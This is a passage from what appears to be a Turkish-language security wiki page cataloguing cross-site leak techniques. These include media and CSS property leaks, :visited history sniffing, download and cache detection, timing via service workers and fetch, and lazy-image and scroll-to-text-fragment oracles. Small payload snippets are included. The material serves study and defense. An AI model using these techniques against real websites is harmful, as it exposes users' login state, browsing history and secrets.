Bu tekniğin bir örneği, Chrome'da bir **PDF**'nin **çerçeve sayımı** ile **tespit edilebilmesidir** çünkü dahili olarak bir `embed` kullanılır. `zoom`, `view`, `page`, `toolbar` gibi içeriği kontrol etmeye olanak tanıyan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardır; bu teknik ilginç olabilir.

### HTMLElements

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** İki olası durumu ayırt etmek için sızdırılan değeri okuyun.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elemanları aracılığıyla bilgi sızdırılması, özellikle dinamik medya dosyaları kullanıcı bilgilerine dayalı olarak oluşturulduğunda veya filigranlar eklendiğinde, medya boyutunu değiştirdiğinde web güvenliği açısından bir endişe kaynağıdır. Bu, belirli HTML elemanları tarafından açığa çıkan bilgileri analiz ederek olası durumları ayırt etmek için saldırganlar tarafından istismar edilebilir.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Bu eleman, medyanın `duration` ve `buffered` sürelerini açığa çıkarır; bunlara API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` değerlerini açığa çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur; bu da medya içeriği hakkında daha derinlemesine bilgi sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Bu fonksiyon, video oynatma kalitesi hakkında bilgiler sağlar; `totalVideoFrames` gibi, işlenen video verisinin miktarını gösterebilir. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bu eleman, bir resmin `height` ve `width` değerlerini sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 döner ve `image.decode()` fonksiyonu reddedilir; bu da resmin düzgün bir şekilde yüklenmediğini gösterir. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Kullanıcının durumu veya statüsü ile ilişkili web sitesi stilindeki değişiklikleri belirleyin.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, kullanıcının durumuna bağlı olarak web sitesi stilini değiştirebilir. Saldırgan sayfasında **HTML link elemanı** ile çapraz kökenli CSS dosyaları gömülebilir ve **kurallar** saldırgan sayfasına **uygulanır**. Eğer bir sayfa bu kuralları dinamik olarak değiştirirse, bir saldırgan kullanıcı durumuna bağlı olarak bu **farklılıkları** **tespit edebilir**.\
Bir sızıntı tekniği olarak, saldırgan belirli bir HTML elemanının **CSS** özelliklerini **okumak için** `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, etkilenen eleman ve özellik adı biliniyorsa, saldırgan keyfi CSS özelliklerini okuyabilir.

### CSS History

- **Inclusion Methods**: HTML Elemanları
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Bir URL'ye `:visited` stilinin uygulanıp uygulanmadığını tespit edin; bu, daha önce ziyaret edildiğini gösterir.
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> [**Bu**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) kaynağa göre, bu başsız Chrome'da çalışmıyor.

CSS `:visited` seçici, daha önce kullanıcı tarafından ziyaret edilmiş URL'leri farklı şekilde stilize etmek için kullanılır. Geçmişte, bu stil farklılıklarını belirlemek için `getComputedStyle()` yöntemi kullanılabiliyordu. Ancak, modern tarayıcılar bu yöntemin bir bağlantının durumunu açığa çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, bağlantının ziyaret edilmiş gibi her zaman hesaplanan stilin döndürülmesini ve `:visited` seçici ile uygulanabilecek stillerin kısıtlanmasını içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak ayırt etmek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alanla etkileşime girmeye ikna etmeyi içerir; özellikle `mix-blend-mode` özelliğini kullanarak. Bu özellik, öğelerin arka planlarıyla karışmasını sağlar ve kullanıcı etkileşimine bağlı olarak ziyaret edilmiş durumu açığa çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render sürelerini istismar ederek tespit sağlanabilir. Tarayıcılar, ziyaret edilmiş ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu render süresinde ölçülebilir bir zaman farkı oluşturabilir. Bir kanıt konsepti (PoC), bu tekniği zaman farkını artırmak için birden fazla bağlantı kullanarak gösteren bir Chromium hata raporunda belirtilmiştir; böylece ziyaret edilmiş durum zaman analizi ile tespit edilebilir.

Bu özellikler ve yöntemler hakkında daha fazla bilgi için belgelerine göz atın:

- `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlıklar
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** Google Chrome'da, X-Frame-Options kısıtlamaları nedeniyle bir sayfanın çapraz kökenli bir sitede gömülmesi engellendiğinde özel bir hata sayfası görüntülenir.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömüldüğünde, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için boş bir belge nesnesi (null yerine) döndürür; bu, iframe'lerde veya diğer tarayıcılarda farklıdır. Saldırganlar, boş belgeyi tespit ederek bunu istismar edebilir ve kullanıcının durumu hakkında bilgi açığa çıkarabilir; özellikle geliştiriciler X-Frame-Options başlığını tutarsız bir şekilde ayarladığında, genellikle hata sayfalarını göz ardı ederler. Güvenlik başlıklarının farkında olmak ve tutarlı bir şekilde uygulanması, bu tür sızıntıları önlemek için kritik öneme sahiptir.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Başlıklar
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği görüntülemek yerine indirmesi talimatını verir. Bu davranış, bir kullanıcının dosya indirmesini tetikleyen bir sayfaya erişip erişmediğini tespit etmek için istismar edilebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik vardır:

1. **İndirme Çubuğu İzleme**:
- Chromium tabanlı tarayıcılarda bir dosya indirildiğinde, tarayıcı penceresinin alt kısmında bir indirme çubuğu görünür.
- Pencere yüksekliğindeki değişiklikleri izleyerek, saldırgan indirme çubuğunun görünümünü çıkarabilir; bu, bir indirmenin başlatıldığını gösterir.
2. **Iframe ile İndirme Navigasyonu**:
- Bir sayfa `Content-Disposition: attachment` başlığını kullanarak bir dosya indirmesini tetiklediğinde, bu bir navigasyon olayı oluşturmaz.
- İçeriği bir iframe'de yükleyerek ve navigasyon olaylarını izleyerek, içerik durumunun bir dosya indirmesine neden olup olmadığını kontrol etmek mümkündür (navigasyon yok) veya olmadığını kontrol edebilirsiniz.
3. **Iframe Olmadan İndirme Navigasyonu**:
- Iframe tekniğine benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
- Yeni açılan penceredeki navigasyon olaylarını izlemek, bir dosya indirmenin tetiklenip tetiklenmediğini (navigasyon yok) veya içeriğin satır içi olarak görüntülenip görüntülenmediğini (navigasyon gerçekleşir) ortaya çıkarabilir.

Sadece giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler kullanıcının kimlik doğrulama durumunu dolaylı olarak çıkarım yapmak için kullanılabilir.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilirliği, dosya indirmenin başarılı olduğunu gösterir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Bu tekniğin ilginç olmasının nedeni: Chrome artık **önbellek bölümlendirmesi** yapıyor ve yeni açılan sayfanın önbellek anahtarı: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`; ancak bir ngrok sayfası açıp içinde fetch kullanırsam, önbellek anahtarı: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)` olacaktır; **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılmaz. Daha fazla ayrıntıyı burada bulabilirsiniz: [Önbelleği bölümlendirerek güvenlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Eğer bir site `example.com`, `*.example.com/resource` adresinden bir kaynak içeriyorsa, o kaynak, kaynağın doğrudan **üst düzey navigasyon** ile talep edilmiş gibi **aynı önbellek anahtarına** sahip olacaktır. Çünkü önbellek anahtarı, üst düzey _eTLD+1_ ve çerçeve _eTLD+1_'den oluşur.

Önbelleğe erişim, bir kaynağı yüklemekten daha hızlı olduğundan, bir sayfanın konumunu değiştirmeyi ve durdurduktan 20ms (örneğin) sonra iptal etmeyi denemek mümkündür. Eğer durdurduktan sonra köken değiştiyse, bu, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **önbelleğe alınmış sayfaya bazı fetch'ler gönderip geçen süreyi ölçebilirsiniz**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Yönlendirmeler
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür.
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** Bir kaynağı yüklemeyi denemek ve yüklenmeden önce yüklemeyi kesmek mümkündür. Bir hata tetiklenip tetiklenmediğine bağlı olarak, kaynak önbelleğe alınmış ya da alınmamıştır.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

_**fetch**_ ve _**setTimeout**_ kullanarak bir **AbortController** ile hem **kaynağın önbelleğe alınıp alınmadığını** tespit etmek hem de belirli bir kaynağı tarayıcı önbelleğinden çıkarmak mümkündür. Ayrıca, bu işlem yeni içerik önbelleğe almadan gerçekleşir.

### Script Pollution

- **Inclusion Methods**: HTML Elemanları (script)
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Yerleşik fonksiyonları **aşırı yazmak** ve bunların argümanlarını okumak mümkündür; bu, **çapraz kökenli script**'ten bile (doğrudan okunamaz) değerli bilgileri **sızdırabilir**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Service worker kullanarak bir webin yürütme süresini ölçün.
- **Code Example**:

Verilen senaryoda, saldırgan, kendi alanlarından biri olan "attacker.com" içinde bir **service worker** kaydetme girişiminde bulunur. Ardından, saldırgan ana belgede hedef web sitesinde yeni bir pencere açar ve **service worker**'a bir zamanlayıcı başlatmasını talimatını verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **service worker** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin gelmesiyle, **service worker** **204 (No Content)** durum kodu ile yanıt verir ve navigasyon sürecini etkili bir şekilde sonlandırır. Bu noktada, **service worker** daha önce ikinci adımda başlatılan zamanlayıcıdan bir ölçüm alır. Bu ölçüm, navigasyon sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

> [!WARNING]
> Bir yürütme zamanlamasında, **daha hassas ölçümler** elde etmek için **ağ faktörlerini** **ortadan kaldırmak** mümkündür. Örneğin, sayfa yüklenmeden önce sayfanın kullandığı kaynakları yükleyerek.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** `window.open` kullanarak bir isteği gerçekleştirmek için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)


## With HTML or Re Injection

Burada, çapraz kökenli HTML'den bilgi sızdırma tekniklerini bulabilirsiniz; **HTML içeriği enjekte etme**. Bu teknikler, herhangi bir nedenle **HTML enjekte edebiliyorsanız ancak JS kodu enjekte edemiyorsanız** ilginçtir.

### Dangling Markup

{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Eğer **içeriği sızdırmanız** gerekiyorsa ve **sırrın öncesine HTML ekleyebiliyorsanız**, **yaygın dangling markup tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenle **her bir karakteri** (belki iletişim bir önbellek vuruşu ile) yapmanız **GEREKİYORSA**, bu hileyi kullanabilirsiniz.

HTML'deki **resimler**, değeri "**lazy**" olan bir "**loading**" niteliğine sahiptir. Bu durumda, resim, sayfa yüklenirken değil, görüntülendiğinde yüklenecektir:
```html
<img src=/something loading=lazy >
```
Bu nedenle, yapabileceğiniz şey **birçok gereksiz karakter eklemek** (örneğin **binlerce "W"**) ve **sayfayı gizli olanın önüne doldurmak veya şuna benzer bir şey eklemek** `<br><canvas height="1850px"></canvas><br>.`\
Örneğin, eğer **enjeksiyonumuz bayraktan önce görünüyorsa**, **görüntü** **yüklenir**, ancak **bayraktan sonra** görünüyorsa, bayrak + gereksiz karakter **yüklenmesini engelleyecektir** (ne kadar gereksiz karakter ekleyeceğinizle oynamanız gerekecek). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan şeydir.

Başka bir seçenek, **izin verilirse scroll-to-text-fragment** kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini** sağlarsınız, bir şeyle gibi
```
#:~:text=SECR
```
Web sayfası şöyle bir şey olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html, saldırganın gereksiz karakterlerini ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacaktır. Bu metin sırdır ve **görüntünün hemen altında** yer almaktadır, **gizli kelime doğru tahmin edilirse görüntü yalnızca yüklenecektir**. Böylece, **sırrı karakter karakter dışarı sızdırmak için oracliniz var**.

Bunu istismar etmek için bir kod örneği: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zamanı Tabanlı

Eğer **bir dış görüntüyü yüklemek mümkün değilse**, bu, saldırgana görüntünün yüklendiğini gösterebilir, başka bir seçenek ise **karakteri birkaç kez tahmin etmeye çalışmak ve bunu ölçmektir**. Eğer görüntü yüklenirse, tüm istekler görüntü yüklenmediğinde olduğundan daha uzun sürecektir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **özetlenmiştir:**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, zamanlama yoluyla **bazı HTML içeriğinin var olup olmadığını** bulmak mümkündür, çünkü eğer `main[id='site-main']` seçici eşleşmiyorsa, **seçicilerin** geri kalanını kontrol etmesine gerek yoktur:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
css-injection/
{{#endref}}

## Defenses

Bu tekniklere karşı nasıl korunacağınız hakkında daha fazla bilgi için [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ve wiki'nin her bölümünde [https://xsleaks.dev/](https://xsleaks.dev/) önerilen önlemler bulunmaktadır.

## References

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../../banners/hacktricks-training.md}}
